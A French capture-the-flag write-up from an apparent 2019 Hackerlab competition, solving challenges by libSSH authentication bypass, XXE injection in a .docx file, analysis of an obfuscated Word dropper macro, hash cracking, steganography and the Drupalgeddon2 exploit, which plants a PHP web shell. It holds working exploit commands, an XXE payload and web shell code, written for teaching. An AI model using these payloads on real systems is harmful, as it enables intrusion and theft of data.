gAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAABCAAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAAIQAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABABCAAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIACECrAABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAIAABABAAAIAIAABABCAAAAIQAAABCAAAAIQAAABCADAF+b/AV/o1gfJJQCOAAAAAElFTkSuQmCC

Nous avons affaire à une image encodé en base64. Copions et collons ça dans la barre d'url du naviguateur: Bingo nous avons le flag: CTF\_AVOIDLFIWHILEPROGRAMMING

* * * * *

                                  Rooter - Miscellaneous

* * * * *

Enoncé: 51.91.120.156 30000

Notre but est de trouver le flag. Nous avons une adresse ip et un port: Essayons une connexion netcat: \$ nc 51.91.120.156 30000 SSH-2.0-libssh\_0.8.1

Bye Bye

Nous avons une version ssh. Essayons de voir ce que nous avons comme vulnérabilité dessus. Une recherchce google dessus nous dévoile une vulnérabilité connu du nom libSSH authentication bypass et de CVE-2018-10993. Un exploit datant de 2018: https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d. Nous allons l'utiliser pour exploiter la faille:

\$ python3 cve-2018-10993.py -p 30000 51.91.120.156

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1

[+] Connected to the target: 51.91.120.156:30000 [?] Obtained banner: "SSH-2.0-libssh\_0.8.1" [+] Target seems to be VULNERABLE!

Nous allons ajouter les options -c et -v pour pouvoir exécuter des commandes en remote. Essayons avec un simple ls :

\$ python3 cve-2018-10993.py -p 30000 51.91.120.156 -v -c 'ls'

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1

[+] Connected to the target: 51.91.120.156:30000 [?] Obtained banner: "SSH-2.0-libssh\_0.8.1" [+] Target seems to be VULNERABLE! [?] Connecting with 51.91.120.156:30000 ... [+] Connected.

\$ ls bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv ssh\_server\_fork.patch sys tmp usr var

Nous observons la présence d'un fichier flag.txt, nous allons lire son contenu:

\$ python3 cve-2018-10993.py -p 30000 51.91.120.156 -v -c 'cat flag.txt'

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1

[+] Connected to the target: 51.91.120.156:30000 [?] Obtained banner: "SSH-2.0-libssh\_0.8.1" [+] Target seems to be VULNERABLE! [?] Connecting with 51.91.120.156:30000 ... [+] Connected.

\$ cat flag.txt CTF\_SSH\_Exploiter Socket exception: Bad file descriptor (9)

Bingo nous avons le flag: CTF\_SSH\_Exploiter

* * * * *

                            La boite à secret - Web

* * * * *

Enoncé: Il semble que Djakpataglo ait un vrai problème avec les fichiers .docx http://hackerlab.bj:8082/

On ouvre le lien dans le naviguateur et on a un message: L'OCRC a arrêté le célèbre GAYEMAN qui affirme après interrogatoire que le flag se trouve dans /var/www/secret et un formulaire d'upload de fichier au format .docx. Après une série d'upload de shell échoués, nous avons su grâce à des recherches qu'il s'agissait de l'xxe (XML External Entity) injection.

Le principe est simple, nous allons injecter du code XML nous permettant de lire le flag /var/www/secret dans le document Word .docx.

Le code à injecter:

<!DOCTYPE replace [ <!ENTITY ent SYSTEM "file:///var/www/secret" > ]\> <dc:title>&ent;</dc:title>

Pour injecter ce code, nous allons créer un simple document .docx et ecrire n'importe quoi dedans puis l'enrégistrer. Ensuite nous allons l'extraire:

\$ unzip payload.docx Archive: payload.docx inflating: *rels/.rels
 inflating: word/*rels/document.xml.rels
 inflating: word/fontTable.xml
 inflating: word/styles.xml
 inflating: word/document.xml
 inflating: word/settings.xml
 inflating: docProps/core.xml
 inflating: docProps/app.xml
 inflating: [Content\_Types].xml

Une fois extrait, allons dans le dossier puis injectons notre charge utile (payload XML) dans le fichier docProps/core.xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <!DOCTYPE replace [ <!ENTITY ent SYSTEM "file:///var/www/secret" > ]\> <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dcterms:created xsi:type="dcterms:W3CDTF">2019-11-21T18:21:30Z</dcterms:created><dc:creator></dc:creator><dc:description></dc:description><dc:language>fr-FR</dc:language><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>0</cp:revision><dc:subject></dc:subject><dc:title>&ent;</dc:title></cp:coreProperties>

Après cela nous allons mettre à jour le fichier sous le même nom c'est à dire payload.docx et ensuite l'uploader:

\$ zip -u payload.docx docProps/core.xml

Après l'upload, on a le flag:

Your flag is 'CTF\_YeahWebExploiter! '

* * * * *

                            Evil Dropper - Reverse Engineering

* * * * *

A cette épreuve est jointe une archive contenant un fichier facture.doc . Quand nous ouvrons le fichier avec word nous avons un avertissement qui dit que le document contient des macros. On clique sur activer pour activer l'execution des macros. Allons maintenant dans le menu "Affichage" de word puis cliquons sur Macro \> Afficher les macros. Nous pouvons voir la macro <Auto_Open>. Cliquons sur Exécuter pas à pas pour executer la macro et l'analyser. Nous remarquons une variable de type chaine de caractère définie au debut: Dim etWoxmfiCOK As String etWoxmfiCOK = wreDPsIVQmesmz(Array(((15 Xor 45) + 38), ((8 Xor 28) + 6), (175 Xor 16), ((81 Xor 14) + 106), (102 + (18 Xor 84)), (54 Xor 255), ((1 Xor 114) + 102), (1 + 2), (7 Xor 54), (121 Xor 2), (25 Xor 55), (104 + (0 Xor 40)), (126 + (26 Xor 88)), ((16 Xor 1) + (212 Xor 13)), (95 + (42 Xor 187)), (8 Xor 184), 63, (2 + 28), ((142 Xor 30) + 107), 110, (49 Xor 134), (7 Xor 229), (0 Xor 49), (25 Xor 150), 17, (3 + 1), 125, (90 Xor 169), (12 + 141), 96, (58 Xor 169), (49 + 58), ((0 Xor 41) + (47 Xor 78)), 173, ((4 Xor 2) + 16), ((1 Xor 13) + (45 Xor 23)), \_ ((23 Xor 59) + 82), (98 Xor 251), ((24 Xor 48) + (10 Xor 30)), (67 Xor 7), (15 + 216), 204, ((44 Xor 75) + 47), 108, ((12 Xor 36) + 12), 2, (95 + (7 Xor 15))), 0) & wreDPsIVQmesmz(Array((6 Xor 71), 216), ((5 Xor 12) + (25 Xor 63)))

Affichons son contenu dans une fenêtre Popup (MSGBOX). Pour cela il suffit d'ajouter MsgBox(etWoxmfiCOK) tout juste après la déclaration de la variable puis d'exécuter le macro à nouveau: Nous avons une fenêtre Popup affichant un lien: http://guidos.hostingerapp.com/flag\_evil\_word.zip C'est un lien vers une archive téléchargeons la. L'archive contient un fichier flag.txt ouvrons la donc pour obtenir le flag. Le flag de cette épreuve est donc:

* * * * *

                                   Bad practice

* * * * *

Enoncé: En respectant les règles d'hygienes informatique, on ne devrait pas être amenés à faire ca 9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5 Précédez la réponse de CTF\_

Le but ici est de decoder le possible hash donné :9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5 Ensuite il faudra préceder le result de CTF\_ Essayons d'identifier le type du hash avec l'outil hash-identifier:

\$ hash-identifier \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\# \# \_\_ \_\_ \_\_ \_\_\_\_\_\_ \_\_\_\_\_ \# \# / /   /   /\_\_ *  /  * `\         #    #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #    #     \ \  _  \  /'__`  / ,**    \_ `\      \ \ \   \ \ \ \ \       #    #      \ \ \ \ \/\ \_\ \_/\__,`       \_ \_\_   \_   \# \#  \_ \_ \_** \_/\_***/  \_ \_  /\_****  \_***/ \# \# /*//*//**//*//***/ /*//*/ /*/ /***/ v1.2 \# \# By Zion3R \# \# www.Blackploit.com \# \# Root@Blackploit.com \# \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\# -------------------------------------------------- HASH: 9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5

Possible Hashs: [+] SHA-256 [+] Haval-256

Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5(\(pass)) [+] SHA-256(sha1(\)pass)) --------------------------------------------------

Nous avons donc affaire à un hash de type SHA-256. Essayons maintenant de le decoder avec CrackStation: https://crackstation.net/ Le hash est décodé:

9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5 sha256 rasdzv3

Le flag est donc CTF\_rasdzv3 Mission accomplie.

* * * * *

                        Amazones jumelles - Stéganographie

* * * * *

Enoncé: La puissance des jumelles, c'est qu'elles vont toujours de pair. C'était pareil pour les amazones.

Sur cette épreuve nous avons téléchargé deux images en format png. L'une cachant le flag. Nous allons donc comparer les deux images afin de faire ressortir le flag. Pour ce faire nous allons utiliser un outil en ligne qui nous permettra d'y arriver: https://futureboy.us/stegano/ https://futureboy.us/stegano/compinput.html

Après comparaison nous téléchageons la différence entre les deux images et nous pouvons voir le flag:

CTF\_XOR\_FDFGDGDFGE

* * * * *

                          Armageddon (End Game) - Web

* * * * *

Enoncé: Votre unité de cyber-amazones est envoyée pour défendre le pays contre l'Armageddon invoqué par DJAKPATAGLO. C'est le clap de fin du \#Hackerlab2019.

http://qualif.hackerlab.bj:8082

Après ouverture du lien dans un nouvel onglet, nous sommmes tombé sur un site conçu avec Drupal avec le message d'acceuil:

"Bienvenue sur Armagueddon Aucun contenu de page d'accueil n'a été créé pour l'instant. Suivre le Guide utilisateur pour démarrer la construction de votre site. " En allant sur le guide utilisateur à l'adresse: https://www.drupal.org/fr/docs/user\_guide/fr/index.html Nous avons su que le site a été conçu avec la version 8 de Drupal. Essayons de trouver de potentielle failles de securité et vulnérabilité.

Après une petite recherche d'exploit, nous sommes tombé sur l'exploit appelé Drupalgeddon2: CVE-2018-7600 Drupal \< 8.3.9 / \< 8.4.6 / \< 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit) codé en ruby. Nous allons l'utiliser sur le site: \$ ruby drupalgeddon2.rb http://qualif.hackerlab.bj:8082 [\*] --==[::\#Drupalggedon2::]==-- -------------------------------------------------------------------------------- [i] Target : http://qualif.hackerlab.bj:8082/ -------------------------------------------------------------------------------- [+] Header : v8 [X-Generator][!] MISSING: http://qualif.hackerlab.bj:8082/CHANGELOG.txt (HTTP Response: 404) [+] Found : http://qualif.hackerlab.bj:8082/core/CHANGELOG.txt (HTTP Response: 200) [!] MISSING: http://qualif.hackerlab.bj:8082/core/CHANGELOG.txt (HTTP Response: 200) [+] Header : v8 [X-Generator][!] MISSING: http://qualif.hackerlab.bj:8082/includes/bootstrap.inc (HTTP Response: 404) [!] MISSING: http://qualif.hackerlab.bj:8082/core/includes/bootstrap.inc (HTTP Response: 403) [!] MISSING: http://qualif.hackerlab.bj:8082/includes/database.inc (HTTP Response: 404) [+] Found : http://qualif.hackerlab.bj:8082/ (HTTP Response: 200) [+] Metatag: v8.x [Generator][!] MISSING: http://qualif.hackerlab.bj:8082/ (HTTP Response: 200) [+] Drupal?: v8.x -------------------------------------------------------------------------------- [\*] Testing: Form (user/register) [+] Result : Form valid - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [\*] Testing: Clean URLs [+] Result : Clean URLs enabled -------------------------------------------------------------------------------- [\*] Testing: Code Execution (Method: mail) [i] Payload: echo VFCGWFFM [+] Result : VFCGWFFM [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO! -------------------------------------------------------------------------------- [\*] Testing: Existing file (http://qualif.hackerlab.bj:8082/shell.php) [!] Response: HTTP 200 // Size: 6. ***Something could already be there?*** - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [\*] Testing: Writing To Web Root (./) [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!! -------------------------------------------------------------------------------- [i] Fake PHP shell: curl 'http://qualif.hackerlab.bj:8082/shell.php' -d 'c=hostname' 97c08f3b7cc3\>\>

* * * * *

Là nous venons d'obtenir un shell. Essayons de rechercher le flag en listant le contenu du répertoire courant:

97c08f3b7cc3\>\> ls LICENSE.txt README.txt autoload.php composer.json composer.lock core example.gitignore flag.txt hello.txt index.php modules profiles robots.txt shell.php sites themes update.php vendor web.config 97c08f3b7cc3\>\>

On peut remarquer la présence d'un fichier flag.txt, lisons son contenu:

97c08f3b7cc3\>\> cat flag.txt CTF\_CyberAmazonWinArmagedon 97c08f3b7cc3\>\>

Bingo le flag pour cette épreuve est donc: CTF\_CyberAmazonWinArmagedon

* * * * *

* * * * *
